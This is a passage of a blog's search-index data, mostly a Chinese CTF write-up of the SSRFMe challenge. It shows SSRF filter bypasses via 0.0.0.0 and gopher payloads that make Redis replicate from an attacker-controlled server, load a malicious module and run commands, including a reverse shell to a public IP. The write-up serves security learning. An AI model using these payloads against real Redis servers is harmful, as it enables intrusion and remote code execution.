","date":"2024-03-09","objectID":"/posts/rdis/:0:1","tags":["redis"],"title":"redis数据库主从复制","uri":"/posts/rdis/"},{"categories":["漏洞学习"],"content":"[网鼎杯 2020 玄武组]SSRFMe \u003c?php function check_inner_ip($url) { $match_result=preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',$url); if (!$match_result) { die('url fomat error'); } try { $url_parse=parse_url($url); } catch(Exception $e) { die('url fomat error'); return false; } $hostname=$url_parse['host']; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long('127.0.0.0')\u003e\u003e24 == $int_ip\u003e\u003e24 || ip2long('10.0.0.0')\u003e\u003e24 == $int_ip\u003e\u003e24 || ip2long('172.16.0.0')\u003e\u003e20 == $int_ip\u003e\u003e20 || ip2long('192.168.0.0')\u003e\u003e16 == $int_ip\u003e\u003e16; } function safe_request_url($url) { if (check_inner_ip($url)) { echo $url.' is inner ip'; } else { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); if ($result_info['redirect_url']) { safe_request_url($result_info['redirect_url']); } curl_close($ch); var_dump($output); } } if(isset($_GET['url'])){ $url = $_GET['url']; if(!empty($url)){ safe_request_url($url); } } else{ highlight_file(__FILE__); } // Please visit hint.php locally. ?\u003e 代码审计，函数check_inner_ip的作用过滤掉了127.0.0.1等本地ip，然后利用 if ($result_info['redirect_url']) { safe_request_url($result_info['redirect_url']); }过滤了dns跳转的绕过方法，可以用dns重绑定，然后0.0.0.0也可以绕过（0.0.0.0 代表本机 ipv4 的所有地址）。 绕过后可以拿到hint 看到file_put_contents后面内容可能会想到死亡绕过，但这里不是，没有写入权限。告诉了redis数据库密码，是redis数据库的攻击， redis常见的getshell有这么几种： 直接写webshell ，将shell写在web目录下 写ssh公钥 写crontab反弹shell，利用定时任务进行反弹shell 主从复制进行getshell 这里第一中中没写入权限不行，然后这里没有ssh和crontab，所以只能用第三种，redis主从复制。 看师傅们的wp，准备好两个工具 https://github.com/xmsec/redis-ssrf https://github.com/n0b0dyCN/redis-rogue-server先是试了自己的kali虚拟机和服务器都没收到回显，看wp还可以用buu本地机试试。 启动buu本地的linux靶机，通过sftp把文件传输到靶机，在通过ssh连接上靶机，如下 然后命令 python rogue-server.py //开始监听但是看有些师傅的wp还要构造payload，有些师傅直接就主从连上了， url命令 gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%252042.193.22.50%25206666%250d%250aquit gopher://0.0.0.0:6379/_auth%2520root%250d%250amodule%2520load%2520/tmp/exp.so%250d%250asystem.rev%252042.193.22.50%25206663%250d%250aquit 但监听没有收到任何连接，以为这道题要烂尾了。 后面周师傅告诉我在NSSCTF上面有同样的题，换个靶场看看 首先先给kali内网穿透 然后下载好工具（不知道为什么工具不一样） 参考：很经典的一道CTF-WriteUP(网鼎杯 2020 玄武组)SSRFMe - FreeBuf网络安全行业门户 参考：https://blog.csdn.net/m0_73512445/article/details/134740916 https://github.com/n0b0dyCN/redis-rogue-server # redis-rogue-server，未授权使用 https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server # Awsome-Redis-Rogue-Server，有授权使用然后把redis-rogue-server的exp.so复制到Awsome-Redis-Rogue-Server文件中，开启监听（最开始监听的是9001，结果发现还是没回显，以为又是环境问题，结果是frp配置问题，好在当初多配了几个端口） python3 redis_rogue_server.py -v -path exp.so -lport 6666先传入 gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit //设置备份文件路径，只有/tmp目录有权限 gopher://0.0.0.0:6379/_auth root config set dir /tmp/ quit会和上面一样，回显三个OK 然后在传入 gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520ip%25209003%250d%250aquit //设置了备份文件名，然后建立主从联系 gopher://0.0.0.0:6379/_auth root config set dbfilename exp.so slaveof 公网ip 9003 quit kali主机得到回显，开始一直循环同步。 gopher://0.0.0.0:6379/_auth%2520root%250d%250amodule%2520load%2520./exp.so%250d%250aquit //把攻击模块加载到从机 gopher://0.0.0.0:6379/_auth root module load ./exp.so quit 传入 gopher://0.0.0.0:6379/_auth%2520root%250d%250aslaveof%2520NO%2520ONE%250d%250aquit //断开主从同步 gopher://0.0.0.0:6379/_auth root slaveof NO ONE quit主机： 导入了模块就可以执行命令了 gopher://0.0.0.0:6379/_auth%2520root%250d%250asystem.exec%2520%2522cat%2520%252Fflag%2522%250d%250aquit gopher://0.0.0.0:6379/_auth root system.exec \"cat /flag\" quit得到flag 至于为什么上面显示连接来自于127.0.0.1，其实是因为frp的原因，可以看看云服务器上 意思是连接时由云服务器转过来的，所以显示127.0.0.1 这道题还可以反弹shell，我就不复现了。 ","date":"2024-03-09","objectID":"/posts/rdis/:0:2","tags":["redis"],"title":"redis数据库主从复制","uri":"/posts/rdis/"},{"categories":null,"content":"介绍 🎓 目前就读成信大 💻 CTF\u0026web ✍️ D0g3成员 ","date":"0001-01-01","objectID":"/about/:0:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"\r6s6\rweb\u0026misc\rYuy0ung\rweb\u0026misc\rfupanc\rweb\rVVkladg0\rweb\rtammy66\rweb\rLitsasuk\rweb\rpRism\rre\rMa\u00260xFly\rpwn\r","date":"0001-01-01","objectID":"/links/:0:0","tags":null,"title":"Links","uri":"/links/"}]